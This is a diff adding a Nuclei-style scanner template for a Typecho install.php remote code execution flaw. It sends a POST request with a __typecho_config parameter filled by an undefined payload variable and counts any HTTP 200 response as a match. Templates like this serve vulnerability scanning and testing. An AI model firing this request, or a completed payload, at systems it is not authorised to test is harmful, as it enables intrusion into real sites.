@@ -1,0 +1,26 @@
+id: poc-yaml-typecho-rce
+
+info:
+  name: poc-yaml-typecho-rce
+  author: last0monster(https://github.com/last0monster)
+  severity: critical
+  tags: xray-converted,rce,ct-158880
+  reference:
+    - https://www.freebuf.com/vuls/155753.html
+    - https://www.freebuf.com/vuls/152058.html
+
+http:
+  - raw:
+      - |
+        POST /install.php?finish HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{referer}}
+
+        __typecho_config={{payload}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
